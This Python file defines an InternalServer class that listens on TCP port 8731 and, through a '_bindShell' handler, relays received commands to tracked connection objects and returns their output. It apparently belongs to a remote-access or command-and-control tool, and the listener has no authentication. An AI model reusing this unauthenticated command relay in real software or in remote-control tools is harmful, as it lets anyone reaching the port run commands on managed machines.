import socket
import threading

class InternalServer(object):
    
    def __init__(self, connectionsObj, port=8731):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.settimeout(1)
        self.ServInfo = (
            socket.gethostbyname(socket.gethostname())
            ,port
        )
        self.connectionsObj = connectionsObj
        self.mainThread = None
        self.running = False
        
    def sendMsg(self, msg, conn):
        if not msg:
            return
        conn.send(
            int.to_bytes(
                len(msg),
                length=4,
                byteorder='big',
            ) + msg
        )

    def recvMsg(self, conn):
        header = int.from_bytes(conn.recv(4), byteorder='big')
        res = conn.recv(header)
        while len(res) < header:
            res += conn.recv(header-len(res))
        return res
    
    def _bindShell(self, conn):
        id = self.recvMsg(conn).decode().strip()
        connObj = self.connectionsObj.getConnObj(id)
        while self.running:
            command = self.recvMsg(conn).decode(errors="replace")
            out = connObj.commandManager._alterRetriveCommand(command)
            self.sendMsg(out.encode(), conn)


    def _listen(self):
        self.server.listen()
        print(f"internal srv listening {str(self.ServInfo)}")
        while self.running:
            try:
                conn, _ = self.server.accept()
            except socket.timeout:
                continue
            t = threading.Thread(target=self._bindShell, args=(conn,))
            t.start()
            
    def start(self):
        print("strating internal Sever.....")
        self.running = True
        self.server.bind(self.ServInfo)
        self.mainThread = threading.Thread(target=self._listen)
        self.mainThread.start()
        
    def stop(self):
        self.running = False
        if self.mainThread:
            self.mainThread.join()
        self.server.close()

